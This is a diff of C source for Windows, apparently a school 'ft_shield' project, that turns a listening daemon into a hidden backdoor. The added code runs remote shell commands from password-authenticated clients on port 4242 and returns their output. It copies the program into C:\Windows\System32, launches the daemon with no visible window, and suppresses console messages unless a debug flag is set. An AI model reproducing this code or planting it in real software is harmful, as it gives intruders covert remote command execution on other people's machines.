@@ -6,18 +6,31 @@
 /*   By: zcadinot <zcadinot@student.42lehavre.      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/10/19 18:02:57 by zcadinot          #+#    #+#             */
-/*   Updated: 2026/10/22 14:17:15 by zcadinot         ###   ########.fr       */
+/*   Updated: 2026/10/22 15:57:25 by zcadinot         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "ft_shield.h"
 #include <lmcons.h>
+#include <stdarg.h>
 #include <stdio.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
 
-#define TEST_PASSWORD "4242"
 #define MAX_CLIENTS 3
+
+void debug_printf(const char *format, ...)
+{
+#ifdef DEBUG
+    va_list args;
+
+    va_start(args, format);
+    vprintf(format, args);
+    va_end(args);
+#else
+    (void)format;
+#endif
+}
 
 typedef struct s_client
 {
@@ -37,19 +50,19 @@ SOCKET init_server(void)
     error = WSAStartup(MAKEWORD(2, 2), &wsa_data);
     if (error != 0)
     {
-        printf("Error: WSAStartup failed: %d\n", error);
+        debug_printf("Error: WSAStartup failed: %d\n", error);
         return INVALID_SOCKET;
     }
-    printf("Success: Winsock initialized\n");
+    debug_printf("Success: Winsock initialized\n");
 
     sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (sock == INVALID_SOCKET)
     {
-        printf("Error: socket failed: %d\n", WSAGetLastError());
+        debug_printf("Error: socket failed: %d\n", WSAGetLastError());
         WSACleanup();
         return INVALID_SOCKET;
     }
-    printf("Success: Socket initialized\n");
+    debug_printf("Success: Socket initialized\n");
 
     memset(&server_addr, 0, sizeof(server_addr));
     server_addr.sin_family = AF_INET;
@@ -58,21 +71,21 @@ SOCKET init_server(void)
 
     if (bind(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR)
     {
-        printf("Error: bind failed: %d\n", WSAGetLastError());
+        debug_printf("Error: bind failed: %d\n", WSAGetLastError());
         closesocket(sock);
         WSACleanup();
         return INVALID_SOCKET;
     }
-    printf("Success: Bind initialized\n");
+    debug_printf("Success: Bind initialized\n");
 
     if (listen(sock, SOMAXCONN) == SOCKET_ERROR)
     {
-        printf("Error: listen failed: %d\n", WSAGetLastError());
+        debug_printf("Error: listen failed: %d\n", WSAGetLastError());
         closesocket(sock);
         WSACleanup();
         return INVALID_SOCKET;
     }
-    printf("Success: Server listening on port 4242\n");
+    debug_printf("Success: Server listening on port 4242\n");
 
     return sock;
 }
@@ -94,15 +107,15 @@ int mode_daemon(void)
     const char *help_message;
 
     help_message = "\n+--------------- COMMANDS ---------------+\n| ?      Show available commands        |\n| shell  Enter safe shell mode           |\n+----------------------------------------+\n$> ";
-    mutex = CreateMutexW(NULL, FALSE, L"Local\\MonApplicationMutex");
+    mutex = CreateMutexW(NULL, FALSE, L"Global\\ft_shield");
     if (mutex == NULL)
     {
-        printf("Erreur mutex : %lu\n", (unsigned long)GetLastError());
+        debug_printf("Erreur mutex : %lu\n", (unsigned long)GetLastError());
         return (1);
     }
     if (GetLastError() == ERROR_ALREADY_EXISTS)
     {
-        printf("Already running...\n");
+        debug_printf("Already running...\n");
         CloseHandle(mutex);
         return (0);
     }
@@ -139,7 +152,7 @@ int mode_daemon(void)
         fd_ready = fd_list;
         if (select(0, &fd_ready, NULL, NULL, NULL) == SOCKET_ERROR)
         {
-            printf("Error: select failed: %d\n", WSAGetLastError());
+            debug_printf("Error: select failed: %d\n", WSAGetLastError());
             break;
         }
         i = 0;
@@ -150,7 +163,7 @@ int mode_daemon(void)
             {
                 client = accept(server_fd, NULL, NULL);
                 if (client == INVALID_SOCKET)
-                    printf("Error: accept failed: %d\n", WSAGetLastError());
+                    debug_printf("Error: accept failed: %d\n", WSAGetLastError());
                 else
                 {
                     slot = 0;
@@ -169,7 +182,7 @@ int mode_daemon(void)
                         clients[slot].cmd = cmd_init();
                         FD_SET(client, &fd_list);
                         send(client, "Keycode: ", 9, 0);
-                        printf("Client connected: %llu\n", (unsigned long long)client);
+                        debug_printf("Client connected: %llu\n", (unsigned long long)client);
                     }
                 }
             }
@@ -183,7 +196,9 @@ int mode_daemon(void)
                     received = recv(current, buffer, sizeof(buffer) - 1, 0);
                     if (received <= 0)
                     {
-                        printf("Client disconnected: %llu\n", (unsigned long long)current);
+                        debug_printf("Client disconnected: %llu\n",
+                                (unsigned long long)current);
+                        cmd_stop(&clients[slot].cmd);
                         FD_CLR(current, &fd_list);
                         closesocket(current);
                         clients[slot].socket = INVALID_SOCKET;
@@ -197,7 +212,7 @@ int mode_daemon(void)
                             buffer[--received] = '\0';
                         if (!clients[slot].authenticated)
                         {
-                            if (strcmp(buffer, TEST_PASSWORD) == 0)
+                            if (password_check(buffer))
                             {
                                 clients[slot].authenticated = 1;
                                 send(current, "Authentication success\n$> ", 26, 0);
@@ -209,8 +224,26 @@ int mode_daemon(void)
                         {
                             if (strcmp(buffer, "exit") == 0)
                             {
+                                cmd_stop(&clients[slot].cmd);
                                 clients[slot].shell_mode = 0;
                                 send(current, "Leaving shell\n$> ", 17, 0);
+                            }
+                            else
+                            {
+                                debug_printf("Shell command from %llu: %s\n",
+                                        (unsigned long long)current, buffer);
+                                if (!cmd_exec(&clients[slot].cmd, buffer))
+                                {
+                                    send(current, "Failed to execute command\nshell> ",
+                                            33, 0);
+                                }
+                                else if (!cmd_send_output(&clients[slot].cmd, current))
+                                {
+                                    send(current, "Failed to read command output\n",
+                                            30, 0);
+                                }
+                                else
+                                    send(current, "\nshell> ", 8, 0);
                             }
                         }
                         else
@@ -219,13 +252,22 @@ int mode_daemon(void)
                                 send(current, help_message, (int)strlen(help_message), 0);
                             else if (strcmp(buffer, "shell") == 0)
                             {
-                                clients[slot].shell_mode = 1;
-                                send(current, "Safe shell started\nshell> ", 26, 0);
-
+                                clients[slot].cmd = cmd_init();
+                                if (!cmd_start(&clients[slot].cmd))
+                                {
+                                    debug_printf("Client %llu: failed to start shell\n",
+                                            (unsigned long long)current);
+                                    send(current, "Shell failed to start\n$> ", 25, 0);
+                                }
+                                else
+                                {
+                                    clients[slot].shell_mode = 1;
+                                    send(current, "Shell started\nshell> ", 21, 0);
+                                }
                             }
                             else
                             {
-                                printf("Client %llu: %s\n", (unsigned long long)current, buffer);
+                                debug_printf("Client %llu: %s\n", (unsigned long long)current, buffer);
                                 send(current, "Message received\n$> ", 20, 0);
                             }
                         }
@@ -260,13 +302,13 @@ int mode_normal(void)
 
     if (!GetUserNameA(login, &size))
     {
-        printf("Erreur : %lu\n", (unsigned long)GetLastError());
+        debug_printf("Erreur : %lu\n", (unsigned long)GetLastError());
         return (0);
     }
 
     if ((mpath = get_my_path()) == NULL)
     {
-        printf("Erreur : %lu\n", (unsigned long)GetLastError());
+        debug_printf("Erreur : %lu\n", (unsigned long)GetLastError());
         return (0);
     }
 
@@ -275,7 +317,7 @@ int mode_normal(void)
 
     if (!CopyFileA(mpath, dst, FALSE) && GetLastError() != ERROR_FILE_EXISTS)
     {
-        printf("Erreur : %lu\n", (unsigned long)GetLastError());
+        debug_printf("Erreur : %lu\n", (unsigned long)GetLastError());
         return (1);
     }
 
@@ -284,9 +326,10 @@ int mode_normal(void)
     WCHAR command_line[] = L"\"C:\\Windows\\System32\\ft_shield.exe\" --daemon";
 
     si.cb = sizeof(si);
-    if (!CreateProcessW(L"C:\\Windows\\System32\\ft_shield.exe", command_line, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, L"C:\\Windows\\System32", &si, &pi))
+    if (!CreateProcessW(L"C:\\Windows\\System32\\ft_shield.exe", command_line, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, L"C:\\Windows\\System32", &si, &pi))
     {
-        printf("CreateProcessW erreur : %lu\n", (unsigned long)GetLastError());
+        debug_printf("CreateProcessW erreur : %lu\n",
+            (unsigned long)GetLastError());
         return (1);
     }
     CloseHandle(pi.hThread);
@@ -294,10 +337,10 @@ int mode_normal(void)
 
     printf("%s\n", login);
 
-    while (1)
-    {
-        continue;
-    }
+    /* while (1) */
+    /* { */
+    /*     continue; */
+    /* } */
     return (1);
 }
 
